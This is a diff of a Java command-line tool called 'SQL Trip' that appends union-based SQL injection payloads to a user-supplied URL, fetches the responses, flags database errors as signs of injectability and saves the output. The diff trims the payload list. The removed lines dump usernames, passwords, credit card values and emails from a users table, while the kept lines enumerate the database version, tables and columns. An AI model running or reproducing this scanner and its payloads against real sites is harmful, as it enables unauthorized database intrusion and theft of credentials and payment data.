@@ -26,7 +26,7 @@ System.out.println("\n Press Author/A/Auth in the choice to see coder info...");
 System.out.print("\n\n Do you want to start SQL Trip to make an adventurous journey through the site ?? [yes/no/Y/N] (Default is no) : ");
 String choice;
 choice=br.readLine();choice=choice.trim();
-if(choice.equalsIgnoreCase("yes") || choice.equalsIgnoreCase("Y"))
+if(choice.equals("yes") || choice.equals("Y"))
 {
 System.out.print("\n\n Starting SQL Trip...Please wait... ");
 Thread.sleep(2000);
@@ -35,13 +35,7 @@ String urlworkwith=url.toString();
 String s=urlworkwith; String end="--+";String s1="";
 String sql_commands[]={" order by 1"," union all select 1,2"," union all select database(),version()",
 " union all select 1,table_name from information_schema.tables"," union select 1,version(),current_user()",
-" union all select 1,column_name from information_schema.columns where table_name=\'users\'"," union all select 1,2"," order by 4",
-" union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 3,1",
-" union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 7,1",
-" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()",
-" union select 1,group_concat(column_name),3 from information_schema.columns where table_name=\'users\'",
-" union select 1,group_concat(uname),3 from users"," union select 1,group_concat(pass),3 from users",
-" union select 1,group_concat(cc),3 from users"," union select 1,group_concat(email),3 from users"};
+" union all select 1,column_name from information_schema.columns where table_name=\'users\'"," union all select 1,2"," order by 4"};
 //String table_name=new String[];
 int k;
 for(k=0;k<(sql_commands.length);k++)
@@ -69,16 +63,13 @@ if((urlString.indexOf("Error"))>=0 || (urlString.indexOf("ERROR"))>=0 || (urlStr
 (urlString.indexOf("WARNING"))>=0 ||(urlString.indexOf("Warning"))>=0)
 {System.out.print(ConsoleColors.GREEN_BOLD+"\n\n Error Based SQL Injection might be possible\n\n"+ConsoleColors.RESET); }
 BufferedWriter writer1 = new BufferedWriter(new FileWriter("urlsqltrip_demo"+k+".txt"));
-BufferedWriter writer2 = new BufferedWriter(new FileWriter("urlsqltrip_demo"+k+".html"));
 writer1.write(urlString);
-writer2.write(urlString);
 /*writer1.append(' ');
 for(int i=1;i<=3;i++) writer1.append(System.lineSeparator());
 writer1.append(" APPENDING ...");
 for(int i=1;i<=3;i++) writer1.append(System.lineSeparator());
 writer1.append(urlString);*/
 writer1.close();
-writer2.close();
 s1="";
 }
 
@@ -89,7 +80,7 @@ s1="";
 else if(choice.equalsIgnoreCase("author")||choice.equals("a")||choice.equals("A")||choice.equalsIgnoreCase("auth"))
 {
 authorinfo(); }
-else { System.out.print(ConsoleColors.RED_BOLD"\n\n SQL Trip not started... Exiting..Program Stopped.."+ConsoleColors.RESET); System.exit(0);}
+else { System.out.print("\n\n SQL Trip not started... Exiting..Program Stopped.."); System.exit(0);}
 }
 
 
@@ -121,7 +112,7 @@ String inputuu="";
 boolean flag=false;
 BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
 while(flag==false)
-{System.out.print(ConsoleColors.CYAN+"\n\n Enter URL followed by parameter :\t"+ConsoleColors.RESET);
+{System.out.print(ConsoleColors.BLUE_BOLD+"\n\n Enter URL followed by parameter :\t"+ConsoleColors.RESET);
 int count=0;
 String b ="";
 inputuu=br.readLine();
@@ -148,9 +139,4 @@ BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
 br.readLine();
 main(new String[0]);
 }
-/*public static File changeExtension(File f, String newExtension) {
-  int i = f.getName().lastIndexOf('.');
-  String name = f.getName().substring(0,i);
-  return new File(f.getParent() + "/" + name + newExtension);
-}*/
 }
